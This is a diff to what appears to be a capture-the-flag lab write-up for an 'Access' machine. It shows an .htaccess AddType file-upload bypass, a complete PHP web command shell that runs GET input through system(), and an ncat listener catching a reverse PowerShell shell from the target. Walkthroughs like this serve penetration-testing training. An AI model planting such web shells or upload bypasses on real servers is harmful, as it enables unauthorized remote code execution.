@@ -76,6 +76,56 @@ echo "AddType application/x-httpd-php .php16" > .htaccess
 
 upload a file with `<?php phpinfo(); ?>` as `.php16`. 
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/30363611-a51a-41b6-a045-2c483508860b)
 
+upload a new file `.php16`. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b6de0240-b442-4a6e-adf5-7407c847159f)
+
+successfully upload the shell. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/3cb21461-a2d7-44f0-af8b-79be8364cbe5)
+
+triggered a phpinfo. let's spawn a reverse shell. 
+
+```php
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
+```
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/f84ad047-7fa4-4f4d-b205-9993454a587f)
+
+uploaded a php cmd shell and we can run RCE. 
+
+```powershell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Access]
+└─$ rlwrap ncat -lnvp 443
+Ncat: Version 7.94SVN ( https://nmap.org/ncat )
+Ncat: Listening on [::]:443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 192.168.163.187:50445.
+
+PS C:\xampp\htdocs\uploads> whoami 
+access\svc_apache
+PS C:\xampp\htdocs\uploads> 
+```
+
+
+## Privilege Escalation 
 
 
